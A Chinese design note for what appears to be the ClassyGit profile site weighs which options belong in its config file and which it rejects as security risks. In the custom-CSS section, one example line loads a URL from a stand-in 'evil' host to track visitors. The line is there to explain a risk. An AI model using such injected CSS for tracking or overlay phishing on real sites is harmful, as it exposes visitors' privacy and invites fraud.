# 配置化评估：哪些东西适合放进 `classy.config.json`

> 结论先行：**所有「表达个人偏好、不改变安全边界、不需要额外服务端资源」的东西都适合配置化；
> 反过来，任何要访问新域名、要写 KV、要执行用户代码的选项都不适合。**

---

## 已经在配置里的（v2）

| 字段 | 作用 | 备注 |
|---|---|---|
| `theme` | 默认主题 | 5 套主题任一 |
| `language` | 默认语言 | `en` / `zh`，访客仍可用 `?lang=` 覆盖 |
| `profile.repos.visible` | 主页是否显示仓库区 | |
| `profile.repos.showCount` | 显示几个仓库 | 0–100，越界夹紧 |
| `profile.cover` | 资料卡封面 | 仅 http(s) |
| `gists.prefix` / `split` / `type` / `default` | Gist 分类规则 | |
| `links` | 页脚链接 | 只允许 http(s)，坏的逐条丢弃 |
| `seo.index` | 是否允许收录主页 | 决定 sitemap 收录 |

## 建议新增（按性价比排序）

### 1. `nav` —— 自定义导航 ⭐️ 最值得做

```json
"nav": {
  "home": true,
  "labels": { "repos": "Projects", "gists": "Writing" },
  "extra": [{ "title": "About", "href": "https://example.com/about" }]
}
```

- 价值：用户可以把「Repos / Gists」改成自己的叫法，或加一条外链（博客、简历）。
- 成本：五套主题的导航都在 Layout 里，统一从 `config.nav` 渲染即可；`href` 沿用现有 http(s) 校验。
- 风险：无（纯展示）。

### 2. `profile.stats` / `profile.location` —— 资料卡显示开关

```json
"profile": { "showStats": true, "showLocation": false, "showCompany": true }
```

- 价值：有人不想暴露公司/位置；有人只想放一两个数字。
- 成本：ProfileCard 里加几个条件判断，五套主题各一次。
- 风险：无。

### 3. `links` 升级为分组 / 带图标

```json
"links": [{ "title": "Blog", "href": "https://…", "icon": "rss" }]
```

- 价值：页脚从纯文字变成有识别度的一排图标。
- 成本：内置 8–10 个图标名（rss/github/x/mail/linkedin/…），SVG 内联。
- 风险：低（图标名走白名单）。

### 4. `share` —— 分享卡片开关与文案

```json
"share": { "enabled": true, "text": "看看我的 ClassyGit 主页" }
```

- 价值：分享卡片的推文文案可定制；不想暴露分享入口的人可以关掉。
- 成本：ShareCard 读两个字段。
- 风险：`text` 会进 `twitter intent` 的 URL 参数，注意长度与转义（已有 `encodeURIComponent`）。

### 5. `pagination.size` —— 仓库分页大小

```json
"pagination": { "reposPerPage": 30 }
```

- 价值：有人仓库多，想一页看 60 个。
- 成本：一个数字，夹紧到 10–100。
- 风险：无（但会影响缓存键数量）。

### 6. `404` —— 自定义「用户不存在」文案

```json
"notFound": { "title": "还没开始写", "body": "这个页面还在施工中" }
```

- 价值：个人风格的一部分，成本极低。
- 风险：纯文本，支持有限的占位符 `{user}`。

### 7. `customCss` —— 一小段自定义 CSS

```json
"customCss": ".site-header { display: none }"
```

- 价值：极客用户最想要的能力，能覆盖主题细节。
- 风险：**这是唯一有安全顾虑的选项**。CSS 本身不能执行 JS，但可以
  `background: url(https://evil/track?x=…)` 造成访客追踪，或覆盖整页做钓鱼。
  建议：**不做**，或者只在「自部署」模式下开启（`allowCustomCss: true` 由部署者决定）。

---

## 明确不该配置化的

| 想法 | 为什么不做 |
|---|---|
| 自定义数据源域名（换掉 api.github.com） | 会把站点变成任意 API 的代理，SSRF/滥用风险；也会破坏缓存与限流模型 |
| 自定义主题 CSS/JS 包（`themeUrl`） | 等价于允许加载第三方远程代码，直接违背「不执行用户代码」的底线 |
| 自定义字体 URL | 远程字体是可行的追踪手段，且会拖慢首屏；内置字体已覆盖中英 |
| 每用户改 sitemap 规则 / robots | 会与 `seo.index` 冲突，让收录策略不可预测 |
| 配置里写 token / 密钥 | 配置是从公开仓库读的，等于公开密钥 |

---

## 实施建议

1. **先做 `nav` + `profile.*` 开关**：改动集中在 Layout 与 ProfileCard，五套主题各几行。
2. 配置解析继续沿用现有的 zod 分段校验：新增字段一律 optional + 默认值，
   坏值只影响那一段（`parseConfig` 已有这套机制）。
3. 每加一个字段，往 `scripts/config-smoke.ts` 补一条断言——现在 15 条，目标是每字段至少一条。
4. 配置体积控制在 10KB 以内：它每次渲染都要从 `raw.githubusercontent.com` 拉一次（缓存 5 分钟）。

## 当前状态

- ✅ `language` 本次新增（`en` / `zh`，默认 `en`）
- ✅ M24 移除 `profile.showFollowers` / `showFollowing`，关注数始终显示
- 📋 `nav` / `profile.stats` / `share.text` / `pagination.size` / `notFound` 待做
